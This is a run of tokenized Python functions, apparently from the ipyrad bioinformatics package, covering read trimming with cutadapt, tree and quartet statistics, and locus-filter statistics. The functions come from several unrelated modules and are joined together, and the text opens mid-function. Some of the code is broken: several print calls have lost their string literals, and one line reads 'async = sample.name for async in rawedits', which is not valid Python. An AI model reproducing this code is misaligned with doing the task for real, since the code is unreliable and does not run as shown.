".trimmed_R1_.fastq.gz" ) , 0 ) ] ## write the long form output to the log file. LOGGER . info ( res1 ) else : print ( "{}No reads passed filtering in Sample: {}" . format ( data . _spacer , sample . name ) )
def parse_pair_results ( data , sample , res ) : LOGGER . info ( "in parse pair mod results\n%s" , res ) ## set default values sample . stats_dfs . s2 [ "trim_adapter_bp_read1" ] = 0 sample . stats_dfs . s2 [ "trim_adapter_bp_read2" ] = 0 sample . stats_dfs . s2 [ "trim_quality_bp_read1" ] = 0 sample . stats_dfs . s2 [ "trim_quality_bp_read2" ] = 0 sample . stats_dfs . s2 [ "reads_filtered_by_Ns" ] = 0 sample . stats_dfs . s2 [ "reads_filtered_by_minlen" ] = 0 sample . stats_dfs . s2 [ "reads_passed_filter" ] = 0 lines = res . strip ( ) . split ( "\n" ) qprimed = 0 for line in lines : ## set primer to catch next line if "Quality-trimmed" in line : qprimed = 1 ## grab read1 and read2 lines when qprimed if "Read 1:" in line : if qprimed : value = int ( line . split ( ) [ 2 ] . replace ( "," , "" ) ) sample . stats_dfs . s2 [ "trim_quality_bp_read1" ] = value if "Read 2:" in line : if qprimed : value = int ( line . split ( ) [ 2 ] . replace ( "," , "" ) ) sample . stats_dfs . s2 [ "trim_quality_bp_read2" ] = value qprimed = 0 if "Read 1 with adapter:" in line : value = int ( line . split ( ) [ 4 ] . replace ( "," , "" ) ) sample . stats_dfs . s2 [ "trim_adapter_bp_read1" ] = value if "Read 2 with adapter:" in line : value = int ( line . split ( ) [ 4 ] . replace ( "," , "" ) ) sample . stats_dfs . s2 [ "trim_adapter_bp_read2" ] = value if "Total read pairs processed:" in line : value = int ( line . split ( ) [ 4 ] . replace ( "," , "" ) ) sample . stats_dfs . s2 [ "reads_raw" ] = value if "Pairs that were too short" in line : value = int ( line . split ( ) [ 5 ] . replace ( "," , "" ) ) sample . stats_dfs . s2 [ "reads_filtered_by_minlen" ] = value if "Pairs with too many N" in line : value = int ( line . split ( ) [ 5 ] . replace ( "," , "" ) ) sample . stats_dfs . s2 [ "reads_filtered_by_Ns" ] = value if "Pairs written (passing filters):" in line : value = int ( line . split ( ) [ 4 ] . replace ( "," , "" ) ) sample . stats_dfs . s2 [ "reads_passed_filter" ] = value ## save to stats summary if sample . stats_dfs . s2 . reads_passed_filter : sample . stats . state = 2 sample . stats . reads_passed_filter = sample . stats_dfs . s2 . reads_passed_filter sample . files . edits = [ ( OPJ ( data . dirs . edits , sample . name + ".trimmed_R1_.fastq.gz" ) , OPJ ( data . dirs . edits , sample . name + ".trimmed_R2_.fastq.gz" ) ) ] else : print ( "No reads passed filtering in Sample: {}" . format ( sample . name ) )
def concat_reads ( data , subsamples , ipyclient ) : ## concatenate reads if they come from merged assemblies. if any ( [ len ( i . files . fastqs ) > 1 for i in subsamples ] ) : ## run on single engine for now start = time . time ( ) printstr = " concatenating inputs  | {} | s2 |" finished = 0 catjobs = { } for sample in subsamples : if len ( sample . files . fastqs ) > 1 : catjobs [ sample . name ] = ipyclient [ 0 ] . apply ( concat_multiple_inputs , * ( data , sample ) ) else : sample . files . concat = sample . files . fastqs ## wait for all to finish while 1 : finished = sum ( [ i . ready ( ) for i in catjobs . values ( ) ] ) elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) progressbar ( len ( catjobs ) , finished , printstr . format ( elapsed ) , spacer = data . _spacer ) time . sleep ( 0.1 ) if finished == len ( catjobs ) : print ( "" ) break ## collect results, which are concat file handles. for async in catjobs : if catjobs [ async ] . successful ( ) : data . samples [ async ] . files . concat = catjobs [ async ] . result ( ) else : error = catjobs [ async ] . result ( ) #exception() LOGGER . error ( "error in step2 concat %s" , error ) raise IPyradWarningExit ( "error in step2 concat: {}" . format ( error ) ) else : for sample in subsamples : ## just copy fastqs handles to concat attribute sample . files . concat = sample . files . fastqs return subsamples
def run_cutadapt ( data , subsamples , lbview ) : ## choose cutadapt function based on datatype start = time . time ( ) printstr = " processing reads      | {} | s2 |" finished = 0 rawedits = { } ## sort subsamples so that the biggest files get submitted first subsamples . sort ( key = lambda x : x . stats . reads_raw , reverse = True ) LOGGER . info ( [ i . stats . reads_raw for i in subsamples ] ) ## send samples to cutadapt filtering if "pair" in data . paramsdict [ "datatype" ] : for sample in subsamples : rawedits [ sample . name ] = lbview . apply ( cutadaptit_pairs , * ( data , sample ) ) else : for sample in subsamples : rawedits [ sample . name ] = lbview . apply ( cutadaptit_single , * ( data , sample ) ) ## wait for all to finish while 1 : finished = sum ( [ i . ready ( ) for i in rawedits . values ( ) ] ) elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) progressbar ( len ( rawedits ) , finished , printstr . format ( elapsed ) , spacer = data . _spacer ) time . sleep ( 0.1 ) if finished == len ( rawedits ) : print ( "" ) break ## collect results, report failures, and store stats. async = sample.name for async in rawedits : if rawedits [ async ] . successful ( ) : res = rawedits [ async ] . result ( ) ## if single cleanup is easy if "pair" not in data . paramsdict [ "datatype" ] : parse_single_results ( data , data . samples [ async ] , res ) else : parse_pair_results ( data , data . samples [ async ] , res ) else : print ( "  found an error in step2; see ipyrad_log.txt" ) LOGGER . error ( "error in run_cutadapt(): %s" , rawedits [ async ] . exception ( ) )
def choose_samples ( samples , force ) : ## hold samples that pass subsamples = [ ] ## filter the samples again if not force : for sample in samples : if sample . stats . state >= 2 : print ( . format ( sample . name ) ) elif not sample . stats . reads_raw : print ( . format ( sample . name , sample . files . fastqs ) ) else : subsamples . append ( sample ) else : for sample in samples : if not sample . stats . reads_raw : print ( . format ( sample . name , sample . files . fastqs ) ) else : subsamples . append ( sample ) return subsamples
def make ( data , samples ) : invcffile = os . path . join ( data . dirs . consens , data . name + ".vcf" ) outlocifile = os . path . join ( data . dirs . outfiles , data . name + ".loci" ) importvcf ( invcffile , outlocifile )
def compute_tree_stats ( self , ipyclient ) : ## get name indices names = self . samples ## get majority rule consensus tree of weighted Q bootstrap trees if self . params . nboots : ## Tree object fulltre = ete3 . Tree ( self . trees . tree , format = 0 ) fulltre . unroot ( ) ## only grab as many boots as the last option said was max with open ( self . trees . boots , 'r' ) as inboots : bb = [ ete3 . Tree ( i . strip ( ) , format = 0 ) for i in inboots . readlines ( ) ] wboots = [ fulltre ] + bb [ - self . params . nboots : ] ## infer consensus tree and write to file wctre , wcounts = consensus_tree ( wboots , names = names ) self . trees . cons = os . path . join ( self . dirs , self . name + ".cons" ) with open ( self . trees . cons , 'w' ) as ocons : ocons . write ( wctre . write ( format = 0 ) ) else : wctre = ete3 . Tree ( self . trees . tree , format = 0 ) wctre . unroot ( ) ## build stats file and write trees self . trees . nhx = os . path . join ( self . dirs , self . name + ".nhx" ) with open ( self . files . stats , 'w' ) as ostats : ## print Tetrad info #ostats.write(STATS_STRING.format(**self.stats)) ## print bootstrap splits if self . params . nboots : ostats . write ( "## splits observed in {} trees\n" . format ( len ( wboots ) ) ) for i , j in enumerate ( self . samples ) : ostats . write ( "{:<3} {}\n" . format ( i , j ) ) ostats . write ( "\n" ) for split , freq in wcounts : if split . count ( '1' ) > 1 : ostats . write ( "{}   {:.2f}\n" . format ( split , round ( freq , 2 ) ) ) ostats . write ( "\n" ) ## parallelized this function because it can be slogging lbview = ipyclient . load_balanced_view ( ) ## store results in dicts qtots = { } qsamp = { } tots = sum ( 1 for i in wctre . iter_leaves ( ) ) totn = set ( wctre . get_leaf_names ( ) ) ## iterate over node traversal.  for node in wctre . traverse ( ) : ## this is slow, needs to look at every sampled quartet ## so we send it be processed on an engine qtots [ node ] = lbview . apply ( _get_total , * ( tots , node ) ) qsamp [ node ] = lbview . apply ( _get_sampled , * ( self , totn , node ) ) ## wait for jobs to finish ipyclient . wait ( ) ## put results into tree for node in wctre . traverse ( ) : ## this is fast, just calcs n_choose_k total = qtots [ node ] . result ( ) sampled = qsamp [ node ] . result ( ) ## store the results to the tree             node . add_feature ( "quartets_total" , total ) node . add_feature ( "quartets_sampled" , sampled ) features = [ "quartets_total" , "quartets_sampled" ] ## return as NHX format with extra info with open ( self . trees . nhx , 'w' ) as outtre : outtre . write ( wctre . write ( format = 0 , features = features ) )
def random_product ( iter1 , iter2 ) : pool1 = tuple ( iter1 ) pool2 = tuple ( iter2 ) ind1 = random . sample ( pool1 , 2 ) ind2 = random . sample ( pool2 , 2 ) return tuple ( ind1 + ind2 )
def count_snps ( mat ) : ## get [aabb, baba, abba, aaab]  snps = np . zeros ( 4 , dtype = np . uint32 ) ## get concordant (aabb) pis sites snps [ 0 ] = np . uint32 ( mat [ 0 , 5 ] + mat [ 0 , 10 ] + mat [ 0 , 15 ] + mat [ 5 , 0 ] + mat [ 5 , 10 ] + mat [ 5 , 15 ] + mat [ 10 , 0 ] + mat [ 10 , 5 ] + mat [ 10 , 15 ] + mat [ 15 , 0 ] + mat [ 15 , 5 ] + mat [ 15 , 10 ] ) ## get discordant (baba) sites for i in range ( 16 ) : if i % 5 : snps [ 1 ] += mat [ i , i ] ## get discordant (abba) sites snps [ 2 ] = mat [ 1 , 4 ] + mat [ 2 , 8 ] + mat [ 3 , 12 ] + mat [ 4 , 1 ] + mat [ 6 , 9 ] + mat [ 7 , 13 ] + mat [ 8 , 2 ] + mat [ 9 , 6 ] + mat [ 11 , 14 ] + mat [ 12 , 3 ] + mat [ 13 , 7 ] + mat [ 14 , 11 ] ## get autapomorphy sites snps [ 3 ] = ( mat . sum ( ) - np . diag ( mat ) . sum ( ) ) - snps [ 2 ] return snps
def calculate ( seqnon , mapcol , nmask , tests ) : ## create empty matrices #LOGGER.info("tests[0] %s", tests[0]) #LOGGER.info('seqnon[[tests[0]]] %s', seqnon[[tests[0]]]) mats = chunk_to_matrices ( seqnon , mapcol , nmask ) ## empty svdscores for each arrangement of seqchunk svds = np . zeros ( ( 3 , 16 ) , dtype = np . float64 ) qscores = np . zeros ( 3 , dtype = np . float64 ) ranks = np . zeros ( 3 , dtype = np . float64 ) for test in range ( 3 ) : ## get svd scores svds [ test ] = np . linalg . svd ( mats [ test ] . astype ( np . float64 ) ) [ 1 ] ranks [ test ] = np . linalg . matrix_rank ( mats [ test ] . astype ( np . float64 ) ) ## get minrank, or 11 minrank = int ( min ( 11 , ranks . min ( ) ) ) for test in range ( 3 ) : qscores [ test ] = np . sqrt ( np . sum ( svds [ test , minrank : ] ** 2 ) ) ## sort to find the best qorder best = np . where ( qscores == qscores . min ( ) ) [ 0 ] #best = qscores[qscores == qscores.min()][0] bidx = tests [ best ] [ 0 ] qsnps = count_snps ( mats [ best ] [ 0 ] ) return bidx , qsnps
def nworker ( data , smpchunk , tests ) : ## tell engines to limit threads #numba.config.NUMBA_DEFAULT_NUM_THREADS = 1 ## open the seqarray view, the modified array is in bootsarr with h5py . File ( data . database . input , 'r' ) as io5 : seqview = io5 [ "bootsarr" ] [ : ] maparr = io5 [ "bootsmap" ] [ : ] ## create an N-mask array of all seq cols (this isn't really too slow) nall_mask = seqview [ : ] == 78 ## tried numba compiling everythign below here, but was not faster ## than making nmask w/ axis arg in numpy ## get the input arrays ready rquartets = np . zeros ( ( smpchunk . shape [ 0 ] , 4 ) , dtype = np . uint16 ) rweights = None #rweights = np.ones(smpchunk.shape[0], dtype=np.float64) rdstats = np . zeros ( ( smpchunk . shape [ 0 ] , 4 ) , dtype = np . uint32 ) #times = [] ## fill arrays with results using numba funcs for idx in xrange ( smpchunk . shape [ 0 ] ) : ## get seqchunk for 4 samples (4, ncols)  sidx = smpchunk [ idx ] seqchunk = seqview [ sidx ] ## get N-containing columns in 4-array, and invariant sites. nmask = np . any ( nall_mask [ sidx ] , axis = 0 ) nmask += np . all ( seqchunk == seqchunk [ 0 ] , axis = 0 ) ## <- do we need this? ## get matrices if there are any shared SNPs ## returns best-tree index, qscores, and qstats #bidx, qscores, qstats = calculate(seqchunk, maparr[:, 0], nmask, tests) bidx , qstats = calculate ( seqchunk , maparr [ : , 0 ] , nmask , tests ) ## get weights from the three scores sorted.  ## Only save to file if the quartet has information rdstats [ idx ] = qstats rquartets [ idx ] = smpchunk [ idx ] [ bidx ] return rquartets , rweights , rdstats
def shuffle_cols ( seqarr , newarr , cols ) : for idx in xrange ( cols . shape [ 0 ] ) : newarr [ : , idx ] = seqarr [ : , cols [ idx ] ] return newarr
def resolve_ambigs ( tmpseq ) : ## iterate over the bases 'RSKWYM': [82, 83, 75, 87, 89, 77] for ambig in np . uint8 ( [ 82 , 83 , 75 , 87 , 89 , 77 ] ) : ## get all site in this ambig idx , idy = np . where ( tmpseq == ambig ) ## get the two resolutions of the ambig res1 , res2 = AMBIGS [ ambig . view ( "S1" ) ] ## randomly sample half those sites halfmask = np . random . choice ( [ True , False ] , idx . shape [ 0 ] ) ## replace ambig bases with their resolutions for i in xrange ( halfmask . shape [ 0 ] ) : if halfmask [ i ] : tmpseq [ idx [ i ] , idy [ i ] ] = np . array ( res1 ) . view ( np . uint8 ) else : tmpseq [ idx [ i ] , idy [ i ] ] = np . array ( res2 ) . view ( np . uint8 ) return tmpseq
def get_spans ( maparr , spans ) : ## start at 0, finds change at 1-index of map file bidx = 1 spans = np . zeros ( ( maparr [ - 1 , 0 ] , 2 ) , np . uint64 ) ## read through marr and record when locus id changes for idx in xrange ( 1 , maparr . shape [ 0 ] ) : cur = maparr [ idx , 0 ] if cur != bidx : idy = idx + 1 spans [ cur - 2 , 1 ] = idx spans [ cur - 1 , 0 ] = idx bidx = cur spans [ - 1 , 1 ] = maparr [ - 1 , - 1 ] return spans
def get_shape ( spans , loci ) : width = 0 for idx in xrange ( loci . shape [ 0 ] ) : width += spans [ loci [ idx ] , 1 ] - spans [ loci [ idx ] , 0 ] return width
def fill_boot ( seqarr , newboot , newmap , spans , loci ) : ## column index cidx = 0 ## resample each locus for i in xrange ( loci . shape [ 0 ] ) : ## grab a random locus's columns x1 = spans [ loci [ i ] ] [ 0 ] x2 = spans [ loci [ i ] ] [ 1 ] cols = seqarr [ : , x1 : x2 ] ## randomize columns within colsq cord = np . random . choice ( cols . shape [ 1 ] , cols . shape [ 1 ] , replace = False ) rcols = cols [ : , cord ] ## fill bootarr with n columns from seqarr ## the required length was already measured newboot [ : , cidx : cidx + cols . shape [ 1 ] ] = rcols ## fill bootmap with new map info newmap [ cidx : cidx + cols . shape [ 1 ] , 0 ] = i + 1 ## advance column index cidx += cols . shape [ 1 ] ## return the concatenated cols return newboot , newmap
def _byteify ( data , ignore_dicts = False ) : if isinstance ( data , unicode ) : return data . encode ( "utf-8" ) if isinstance ( data , list ) : return [ _byteify ( item , ignore_dicts = True ) for item in data ] if isinstance ( data , dict ) and not ignore_dicts : return { _byteify ( key , ignore_dicts = True ) : _byteify ( value , ignore_dicts = True ) for key , value in data . iteritems ( ) } return data
def _parse_names ( self ) : self . samples = [ ] with iter ( open ( self . files . data , 'r' ) ) as infile : infile . next ( ) . strip ( ) . split ( ) while 1 : try : self . samples . append ( infile . next ( ) . split ( ) [ 0 ] ) except StopIteration : break
def _run_qmc ( self , boot ) : ## convert to txt file for wQMC self . _tmp = os . path . join ( self . dirs , ".tmpwtre" ) cmd = [ ip . bins . qmc , "qrtt=" + self . files . qdump , "otre=" + self . _tmp ] ## run them proc = subprocess . Popen ( cmd , stderr = subprocess . STDOUT , stdout = subprocess . PIPE ) res = proc . communicate ( ) if proc . returncode : #LOGGER.error("Error in QMC: \n({}).".format(res)) LOGGER . error ( res ) raise IPyradWarningExit ( res [ 1 ] ) ## read in the tmp files since qmc does not pipe with open ( self . _tmp ) as intree : ## convert int names back to str names renamer returns a newick str #tmp = toytree.tree(intree.read().strip()) tmp = ete3 . Tree ( intree . read ( ) . strip ( ) ) tmpwtre = self . _renamer ( tmp ) #.tree) ## save the tree if boot : self . trees . boots = os . path . join ( self . dirs , self . name + ".boots" ) with open ( self . trees . boots , 'a' ) as outboot : outboot . write ( tmpwtre + "\n" ) else : self . trees . tree = os . path . join ( self . dirs , self . name + ".tree" ) with open ( self . trees . tree , 'w' ) as outtree : outtree . write ( tmpwtre ) ## save JSON file checkpoint self . _save ( )
def _renamer ( self , tre ) : ## get the tre with numbered tree tip labels names = tre . get_leaves ( ) ## replace numbered names with snames for name in names : name . name = self . samples [ int ( name . name ) ] ## return with only topology and leaf labels return tre . write ( format = 9 )
def _finalize_stats ( self , ipyclient ) : ## print stats file location: #print(STATSOUT.format(opr(self.files.stats))) ## print finished tree information --------------------- print ( FINALTREES . format ( opr ( self . trees . tree ) ) ) ## print bootstrap information -------------------------- if self . params . nboots : ## get consensus, map values to tree edges, record stats file self . _compute_tree_stats ( ipyclient ) ## print bootstrap info print ( BOOTTREES . format ( opr ( self . trees . cons ) , opr ( self . trees . boots ) ) ) ## print the ASCII tree only if its small if len ( self . samples ) < 20 : if self . params . nboots : wctre = ete3 . Tree ( self . trees . cons , format = 0 ) wctre . ladderize ( ) print ( wctre . get_ascii ( show_internal = True , attributes = [ "dist" , "name" ] ) ) print ( "" ) else : qtre = ete3 . Tree ( self . trees . tree , format = 0 ) qtre . ladderize ( ) #qtre = toytree.tree(self.trees.tree, format=0) #qtre.tree.unroot() print ( qtre . get_ascii ( ) ) print ( "" ) ## print PDF filename & tips ----------------------------- docslink = "https://toytree.readthedocs.io/" citelink = "https://ipyrad.readthedocs.io/tetrad.html" print ( LINKS . format ( docslink , citelink ) )
def _save ( self ) : ## save each attribute as dict fulldict = copy . deepcopy ( self . __dict__ ) for i , j in fulldict . items ( ) : if isinstance ( j , Params ) : fulldict [ i ] = j . __dict__ fulldumps = json . dumps ( fulldict , sort_keys = False , indent = 4 , separators = ( "," , ":" ) , ) ## save to file, make dir if it wasn't made earlier assemblypath = os . path . join ( self . dirs , self . name + ".tet.json" ) if not os . path . exists ( self . dirs ) : os . mkdir ( self . dirs ) ## protect save from interruption done = 0 while not done : try : with open ( assemblypath , 'w' ) as jout : jout . write ( fulldumps ) done = 1 except ( KeyboardInterrupt , SystemExit ) : print ( '.' ) continue
def _insert_to_array ( self , start , results ) : qrts , wgts , qsts = results #qrts, wgts = results #print(qrts) with h5py . File ( self . database . output , 'r+' ) as out : chunk = self . _chunksize out [ 'quartets' ] [ start : start + chunk ] = qrts ##out['weights'][start:start+chunk] = wgts ## entered as 0-indexed ! if self . checkpoint . boots : key = "qboots/b{}" . format ( self . checkpoint . boots - 1 ) out [ key ] [ start : start + chunk ] = qsts else : out [ "qstats" ] [ start : start + chunk ] = qsts
def make_stats ( data , samples , samplecounts , locuscounts ) : ## get meta info with h5py . File ( data . clust_database , 'r' ) as io5 : anames = io5 [ "seqs" ] . attrs [ "samples" ] nloci = io5 [ "seqs" ] . shape [ 0 ] optim = io5 [ "seqs" ] . attrs [ "chunksize" ] [ 0 ] ## open the out handle. This will have three data frames saved to it. ## locus_filtering, sample_coverages, and snp_distributions data . stats_files . s7 = os . path . join ( data . dirs . outfiles , data . name + "_stats.txt" ) outstats = io . open ( data . stats_files . s7 , 'w' , encoding = "utf-8" ) ######################################################################## ## get stats for locus_filtering, use chunking. filters = np . zeros ( 6 , dtype = int ) passed = 0 start = 0 piscounts = Counter ( ) varcounts = Counter ( ) for i in range ( 200 ) : piscounts [ i ] = 0 varcounts [ i ] = 0 applied = pd . Series ( [ 0 ] * 8 , name = "applied_order" , index = [ "total_prefiltered_loci" , "filtered_by_rm_duplicates" , "filtered_by_max_indels" , "filtered_by_max_snps" , "filtered_by_max_shared_het" , "filtered_by_min_sample" , "filtered_by_max_alleles" , "total_filtered_loci" ] ) ## load the h5 database co5 = h5py . File ( data . database , 'r' ) while start < nloci : hslice = [ start , start + optim ] ## load each array afilt = co5 [ "filters" ] [ hslice [ 0 ] : hslice [ 1 ] , ] asnps = co5 [ "snps" ] [ hslice [ 0 ] : hslice [ 1 ] , ] ## get subarray results from filter array # max_indels, max_snps, max_hets, min_samps, bad_edges, max_alleles filters += afilt . sum ( axis = 0 ) applied [ "filtered_by_rm_duplicates" ] += afilt [ : , 0 ] . sum ( ) mask = afilt [ : , 0 ] . astype ( np . bool ) applied [ "filtered_by_max_indels" ] += afilt [ ~ mask , 1 ] . sum ( ) mask = afilt [ : , 0 : 2 ] . sum ( axis = 1 ) . astype ( np . bool ) applied [ "filtered_by_max_snps" ] += afilt [ ~ mask , 2 ] . sum ( ) mask = afilt [ : , 0 : 3 ] . sum ( axis = 1 ) . astype ( np . bool ) applied [ "filtered_by_max_shared_het" ] += afilt [ ~ mask , 3 ] . sum ( ) mask = afilt [ : , 0 : 4 ] . sum ( axis = 1 ) . astype ( np . bool ) applied [ "filtered_by_min_sample" ] += afilt [ ~ mask , 4 ] . sum ( ) mask = afilt [ : , 0 : 5 ] . sum ( axis = 1 ) . astype ( np . bool ) applied [ "filtered_by_max_alleles" ] += afilt [ ~ mask , 5 ] . sum ( ) passed += np . sum ( afilt . sum ( axis = 1 ) == 0 ) ## get filter to count snps for only passed loci ## should we filter by all vars, or just by pis? doing all var now. apply_filter = afilt . sum ( axis = 1 ) . astype ( np . bool ) ## get snps counts snplocs = asnps [ ~ apply_filter , : ] . sum ( axis = 1 ) varlocs = snplocs . sum ( axis = 1 ) varcounts . update ( Counter ( varlocs ) ) #snpcounts.update(Counter(snplocs[:, 0])) piscounts . update ( Counter ( snplocs [ : , 1 ] ) ) ## increase counter to advance through h5 database start += optim ## record filtering of loci from total to final filtdat = pd . Series ( np . concatenate ( [ [ nloci ] , filters , [ passed ] ] ) , name = "total_filters" , index = [ "total_prefiltered_loci" , "filtered_by_rm_duplicates" , "filtered_by_max_indels" , "filtered_by_max_snps" , "filtered_by_max_shared_het" , "filtered_by_min_sample" , "filtered_by_max_alleles" , "total_filtered_loci" ] ) retained = pd . Series ( [ 0 ] * 8 , name = "retained_loci" , index = [ "total_prefiltered_loci" , "filtered_by_rm_duplicates" , "filtered_by_max_indels" , "filtered_by_max_snps" , "filtered_by_max_shared_het" , "filtered_by_min_sample" , "filtered_by_max_alleles" , "total_filtered_loci" ] ) retained [ "total_prefiltered_loci" ] = nloci retained [ "filtered_by_rm_duplicates" ] = nloci - applied [ "filtered_by_rm_duplicates" ] retained [ "filtered_by_max_indels" ] = retained [ "filtered_by_rm_duplicates" ] - applied [ "filtered_by_max_indels" ] retained [ "filtered_by_max_snps" ] = retained [ "filtered_by_max_indels" ] - applied [ "filtered_by_max_snps" ] retained [ "filtered_by_max_shared_het" ] = retained [ "filtered_by_max_snps" ] - applied [ "filtered_by_max_shared_het" ] retained [ "filtered_by_min_sample" ] = retained [ "filtered_by_max_shared_het" ] - applied [ "filtered_by_min_sample" ] retained [ "filtered_by_max_alleles" ] = retained [ "filtered_by_min_sample" ] - applied [ "filtered_by_max_alleles" ] retained [ "total_filtered_loci" ] = passed print ( u"\n\n## The number of loci caught by each filter." + u"\n## ipyrad API location: [assembly].stats_dfs.s7_filters\n" , file = outstats ) data . stats_dfs . s7_filters = pd . DataFrame ( [ filtdat , applied , retained ] ) . T data . stats_dfs . s7_filters . to_string ( buf = outstats ) ######################################################################## ## make dataframe of sample_coverages ## samplecounts is len of anames from db. Save only samples in samples. #print(samplecounts) #samples = [i.name for i in samples] ## get sample names in the order of anames #sids = [list(anames).index(i) for i in samples] #covdict = {name: val for name, val in zip(np.array(samples)[sidx], samplecounts)} #covdict = {name: val for name, val in zip(samples, samplecounts[sidx])} covdict = pd . Series ( samplecounts , name = "sample_coverage" , index = anames ) covdict = covdict [ covdict != 0 ] print ( u"\n\n\n## The number of loci recovered for each Sample." + u"\n## ipyrad API location: [assembly].stats_dfs.s7_samples\n" , file = outstats ) data . stats_dfs . s7_samples = pd . DataFrame ( covdict ) data . stats_dfs . s7_samples . to_string ( buf = outstats ) ######################################################################## ## get stats for locus coverage lrange = range ( 1 , len ( samples ) + 1 ) locdat = pd . Series ( locuscounts , name = "locus_coverage" , index = lrange ) start = data . paramsdict [ "min_samples_locus" ] - 1 locsums = pd . Series ( { i : np . sum ( locdat . values [ start : i ] ) for i in lrange } , name = "sum_coverage" , index = lrange ) print ( u"\n\n\n## The number of loci for which N taxa have data." + u"\n## ipyrad API location: [assembly].stats_dfs.s7_loci\n" , file = outstats ) data . stats_dfs . s7_loci = pd . concat ( [ locdat , locsums ] , axis = 1 ) data . stats_dfs . s7_loci . to_string ( buf = outstats ) ######################################################################### ## get stats for SNP_distribution try : smax = max ( [ i + 1 for i in varcounts if varcounts [ i ] ] ) except Exception as inst : raise IPyradWarningExit ( ) vardat = pd . Series ( varcounts , name = "var" , index = range ( smax ) ) . fillna ( 0 ) sumd = { } for i in range ( smax ) : sumd [ i ] = np . sum ( [ i * vardat . values [ i ] for i in range ( i + 1 ) ] ) varsums = pd . Series ( sumd , name = "sum_var" , index = range ( smax ) ) pisdat = pd . Series ( piscounts , name = "pis" , index = range ( smax ) ) . fillna ( 0 ) sumd = { } for i in range ( smax ) : sumd [ i ] = np . sum ( [ i * pisdat . values [ i ] for i in range ( i + 1 ) ] ) pissums = pd . Series ( sumd , name = "sum_pis" , index = range ( smax ) ) print ( u"\n\n\n## The distribution of SNPs (var and pis) per locus." + u"\n## var = Number of loci with n variable sites (pis + autapomorphies)" + u"\n## pis = Number of loci with n parsimony informative site (minor allele in >1 sample)" + u"\n## ipyrad API location: [assembly].stats_dfs.s7_snps\n" , file = outstats ) data . stats_dfs . s7_snps = pd . concat ( [ vardat , varsums , pisdat , pissums ] , axis = 1 ) data . stats_dfs . s7_snps . to_string ( buf = outstats ) ########################################################################## ## print the stats summary (-r summary) with final sample loci data. fullstat = data . stats fullstat [ 'state' ] = 7 fullstat [ "loci_in_assembly" ] = data . stats_dfs . s7_samples print ( u"\n\n\n## Final Sample stats summary\n" , file = outstats ) fullstat . to_string ( buf = outstats ) ## close it outstats . close ( ) co5 . close ( )
def padnames ( names ) : ## get longest name longname_len = max ( len ( i ) for i in names ) ## Padding distance between name and seq. padding = 5 ## add pad to names pnames = [ name + " " * ( longname_len - len ( name ) + padding ) for name in names ] snppad = "//" + " " * ( longname_len - 2 + padding ) return np . array ( pnames ) , snppad
def locichunk ( args ) : ## parse args data , optim , pnames , snppad , smask , start , samplecov , locuscov , upper = args ## this slice hslice = [ start , start + optim ] ## get filter db info co5 = h5py . File ( data . database , 'r' ) afilt = co5 [ "filters" ] [ hslice [ 0 ] : hslice [ 1 ] , ] aedge = co5 [ "edges" ] [ hslice [ 0 ] : hslice [ 1 ] , ] asnps = co5 [ "snps" ] [ hslice [ 0 ] : hslice [ 1 ] , ] ## get seqs db io5 = h5py . File ( data . clust_database , 'r' ) if upper : aseqs = np . char . upper ( io5 [ "seqs" ] [ hslice [ 0 ] : hslice [ 1 ] , ] ) else : aseqs = io5 [ "seqs" ] [ hslice [ 0 ] : hslice [ 1 ] , ] ## which loci passed all filters keep = np . where ( np . sum ( afilt , axis = 1 ) == 0 ) [ 0 ] store = [ ] ## write loci that passed after trimming edges, then write snp string for iloc in keep : edg = aedge [ iloc ] #LOGGER.info("!!!!!! iloc edg %s, %s", iloc, edg) args = [ iloc , pnames , snppad , edg , aseqs , asnps , smask , samplecov , locuscov , start ] if edg [ 4 ] : outstr , samplecov , locuscov = enter_pairs ( * args ) store . append ( outstr ) else : outstr , samplecov , locuscov = enter_singles ( * args ) store . append ( outstr ) ## write to file and clear store tmpo = os . path . join ( data . dirs . outfiles , data . name + ".loci.{}" . format ( start ) ) with open ( tmpo , 'w' ) as tmpout : tmpout . write ( "\n" . join ( store ) + "\n" ) ## close handles io5 . close ( ) co5 . close ( ) ## return sample counter return samplecov , locuscov , start
def enter_pairs ( iloc , pnames , snppad , edg , aseqs , asnps , smask , samplecov , locuscov , start ) : ## snps was created using only the selected samples. LOGGER . info ( "edges in enter_pairs %s" , edg ) seq1 = aseqs [ iloc , : , edg [ 0 ] : edg [ 1 ] + 1 ] snp1 = asnps [ iloc , edg [ 0 ] : edg [ 1 ] + 1 , ] ## the 2nd read edges are +5 for the spacer seq2 = aseqs [ iloc , : , edg [ 2 ] : edg [ 3 ] + 1 ] snp2 = asnps [ iloc , edg [ 2 ] : edg [ 3 ] + 1 , ] ## remove rows with all Ns, seq has only selected samples nalln = np . all ( seq1 == "N" , axis = 1 ) ## make mask of removed rows and excluded samples. Use the inverse ## of this to save the coverage for samples nsidx = nalln + smask LOGGER . info ( "nsidx %s, nalln %s, smask %s" , nsidx , nalln , smask ) samplecov = samplecov + np . invert ( nsidx ) . astype ( np . int32 ) LOGGER . info ( "samplecov %s" , samplecov ) idx = np . sum ( np . invert ( nsidx ) . astype ( np . int32 ) ) LOGGER . info ( "idx %s" , idx ) locuscov [ idx ] += 1 ## select the remaining names in order seq1 = seq1 [ ~ nsidx , ] seq2 = seq2 [ ~ nsidx , ] names = pnames [ ~ nsidx ] ## save string for printing, excluding names not in samples outstr = "\n" . join ( [ name + s1 . tostring ( ) + "nnnn" + s2 . tostring ( ) for name , s1 , s2 in zip ( names , seq1 , seq2 ) ] ) #LOGGER.info("s1 %s", s1.tostring()) #LOGGER.info("s2 %s", s2.tostring()) ## get snp string and add to store snpstring1 = [ "-" if snp1 [ i , 0 ] else "*" if snp1 [ i , 1 ] else " " for i in range ( len ( snp1 ) ) ] snpstring2 = [ "-" if snp2 [ i , 0 ] else "*" if snp2 [ i , 1 ] else " " for i in range ( len ( snp2 ) ) ] #npis = str(snpstring1+snpstring2).count("*") #nvars = str(snpstring1+snpstring2).count("-") + npis outstr += "\n" + snppad + "" . join ( snpstring1 ) + "    " + "" . join ( snpstring2 ) + "|{}|" . format ( iloc + start ) #"|LOCID={},DBID={},NVAR={},NPIS={}|"\ #.format(1+iloc+start, iloc, nvars, npis) return outstr , samplecov , locuscov
